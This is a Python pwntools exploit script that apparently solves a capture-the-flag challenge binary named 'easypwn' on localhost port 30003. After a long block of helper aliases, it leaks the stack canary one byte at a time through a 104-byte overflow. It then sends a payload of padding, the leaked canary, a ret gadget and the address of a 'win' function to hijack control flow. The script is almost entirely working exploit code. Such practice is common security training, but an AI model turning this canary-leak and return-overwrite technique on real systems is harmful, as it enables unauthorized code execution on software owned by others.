#!/usr/bin/env python3
from pwn import *
import sys

# abbreviations
cst = constants
shc = shellcraft

# logging
linfo = lambda x, *a: log.info(x, *a)
lwarn = lambda x, *a: log.warn(x, *a)
lerr  = lambda x, *a: log.error(x, *a)
lprog = lambda x, *a: log.progress(x, *a)
lhex  = lambda x, y="leak": linfo(f"{x:#018x} <- {y}")
phex  = lambda x, y="leak": print(f"{x:#018x} <- {y}")

# type manipulation
byt   = lambda x: x if isinstance(x, (bytes, bytearray)) else f"{x}".encode()
rpad  = lambda x, s=8, v=b"\0": x.ljust(s, v)
lpad  = lambda x, s=8, v=b"\0": x.rjust(s, v)
hpad  = lambda x, s=0: f"%0{s if s else ((x.bit_length() // 8) + 1) * 2}x" % x
upad  = lambda x: u64(rpad(x))
cpad  = lambda x, s: byt(x) + cyc(s)[len(byt(x)):]
tob   = lambda x: bytes.fromhex(hpad(x))

# elf aliases
gelf  = lambda elf=None: elf if elf else exe
srh   = lambda x, elf=None: gelf(elf).search(byt(x)).__next__()
sasm  = lambda x, elf=None: gelf(elf).search(asm(x), executable=True).__next__()
lsrh  = lambda x: srh(x, libc)
lasm  = lambda x: sasm(x, libc)

# cyclic aliases
cyc = lambda x: cyclic(x)
cfd = lambda x: cyclic_find(x)
cto = lambda x: cyc(cfd(x))

# tube aliases
t   = None
gt  = lambda at=None: at if at else t
sl  = lambda x, t=None, *a, **kw: gt(t).sendline(byt(x), *a, **kw)
se  = lambda x, t=None, *a, **kw: gt(t).send(byt(x), *a, **kw)
ss  = (
        lambda x, s, t=None, *a, **kw: sl(x, t, *a, **kw)
        if len(x) < s
        else se(x, *a, **kw)
          if len(x) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
sla = lambda x, y, t=None, *a, **kw: gt(t).sendlineafter(
        byt(x), byt(y), *a, **kw
      )
sa  = lambda x, y, t=None, *a, **kw: gt(t).sendafter(byt(x), byt(y), *a, **kw)
sas = (
        lambda x, y, s, t=None, *a, **kw: sla(x, y, t, *a, **kw)
        if len(y) < s
        else sa(x, y, *a, **kw)
          if len(y) == s
          else lerr(f"ss to big: {len(x):#x} > {s:#x}")
      )
ra  = lambda t=None, *a, **kw: gt(t).recvall(*a, **kw)
rl  = lambda t=None, *a, **kw: gt(t).recvline(*a, **kw)
rls = lambda t=None, *a, **kw: rl(t=t, *a, **kw)[:-1]
rcv = lambda x, t=None, *a, **kw: gt(t).recv(x, *a, **kw)
ru  = lambda x, t=None, *a, **kw: gt(t).recvuntil(byt(x), *a, **kw)
it  = lambda t=None, *a, **kw: gt(t).interactive(*a, **kw)
cl  = lambda t=None, *a, **kw: gt(t).close(*a, **kw)

rol = lambda val, r_bits, max_bits: \
    (val << r_bits%max_bits) & (2**max_bits-1) | \
    ((val & (2**max_bits-1)) >> (max_bits-(r_bits%max_bits)))

ror = lambda val, r_bits, max_bits: \
    ((val & (2**max_bits-1)) >> r_bits%max_bits) | \
    (val << (max_bits-(r_bits%max_bits)) & (2**max_bits-1))

GDB_SCRIPT = f"""
set disassembly-flavor intel
break *main
continue
"""

# note that PIE is disabled in the binary so the address of the win function is fixed!

exe = ELF("./easypwn")
context.binary = exe
context.aslr = False
IP     = 'localhost'   
# IP = host = sys.argv[1]
PORT   = 30003
# PORT = int(sys.argv[2])

def conn():
    # for actual automated script:
    # return remote(IP, PORT)
    if args.LOCAL:
        r = process([exe.path])
        # argv = [ld.path, exe.path]
        # env = {"LD_PRELOAD": libc.path}
        # r = process(argv, env=env)
        if args.GDB:
            gdb.attach(r, gdbscript=GDB_SCRIPT)
    else:
        r = remote(IP, PORT)
    return r

context.log_level = 'debug'
t = conn()
canary = b""

for i in range(8): # leak 8 bytes of the canary byte by byte
    sla(b'Choice: ', b"1")
    se(b'a' * 104 + canary)
    response = rl()
    last_byte = response[-2]
    lhex(last_byte)
    canary += last_byte.to_bytes(length = 1, byteorder = 'little')

canary = int.from_bytes(canary, 'little')
lhex(canary, "canary")

# 104 bytes padding
# 8-byte canary
# 8-byte junk value to overwrite saved RBP
# 8 bytes (points to RET instruction to deal with movaps issue)
# 8 bytes (address of win function)

pl = b'a' * 104 + p64(canary) + p64(0) + p64(0x4013a3) + p64(exe.sym['win'])
sla(b'Choice: ', b"1")
se(pl)
it()